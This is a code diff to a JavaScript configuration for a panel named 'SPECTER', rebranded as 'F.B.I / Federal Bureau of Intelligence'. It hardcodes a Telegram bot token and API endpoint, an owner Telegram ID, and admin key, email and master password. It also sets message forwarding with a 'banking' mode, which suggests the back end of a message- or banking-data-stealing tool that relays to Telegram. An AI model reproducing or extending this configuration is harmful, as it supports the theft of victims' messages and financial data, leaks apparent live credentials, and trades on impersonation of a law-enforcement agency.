@@ -1,26 +1,38 @@
-/* ═══════════════════════════════════════════════════════════
-   SPECTER CONFIG — Fixed Telegram Bot
-   ═══════════════════════════════════════════════════════════ */
 window.SPECTER = {
+  PANEL_NAME: 'F.B.I',
+  PANEL_FULL: 'Federal Bureau of Intelligence',
+  LOGO_URL: 'https://i.ibb.co/rKj7BZ7C/IMG-20260914-230127-675.jpg',
+
   BOT_TOKEN: '8834038897:AAHzJwwV_vHEa5MMNT-8EZuQoSQPhBWZYwo',
   TG_API: 'https://api.telegram.org/bot8834038897:AAHzJwwV_vHEa5MMNT-8EZuQoSQPhBWZYwo',
 
-  BLOB_BASE: 'https://jsonblob.com/api/jsonBlob',
+  // 👇 YAHAN APNI TELEGRAM USER ID DAALO (numeric)
+  OWNER_TELEGRAM_ID: '799339143',
 
-  LS_BLOB:    'specter_blob_id',
-  LS_CACHE:   'specter_config_cache',
-  LS_SESSION: 'specter_session',
-  LS_ACTIVE:  'specter_active_device',
+  BLOB_BASE: 'https://jsonblob.com/api/jsonBlob',
+  KEYS_BLOB_ID: '',
+
+  ADMIN_KEY: 'FBI-ADMIN-MASTER-2026',
+  ADMIN_EMAIL: 'admin@fbi.local',
+  ADMIN_MASTER_PASSWORD: 'FBI@2026',
+
+  LS_BLOB:    'fbi_blob_id',
+  LS_CACHE:   'fbi_config_cache',
+  LS_SESSION: 'fbi_session',
+  LS_ACTIVE:  'fbi_active_device',
+  LS_LICENSE: 'fbi_license',
+  LS_DEVICE_FP: 'fbi_device_fp',
+  LS_USERS:   'fbi_users_list',
 
   POLL_MS: 500,
 
   DEFAULT_CONFIG: {
-  channelId:      '',
-  userId:         '',
-  myNumber:       '',
-  firebases:      [],
-  forwardEnabled: true,
-  forwardMode:    'all',     // 👈 ADD THIS — 'all' or 'banking'
-  botEnabled:     true
-}
+    channelId:      '',
+    userId:         '',
+    myNumber:       '',
+    firebases:      [],
+    forwardEnabled: true,
+    forwardMode:    'all',
+    botEnabled:     true
+  }
 };
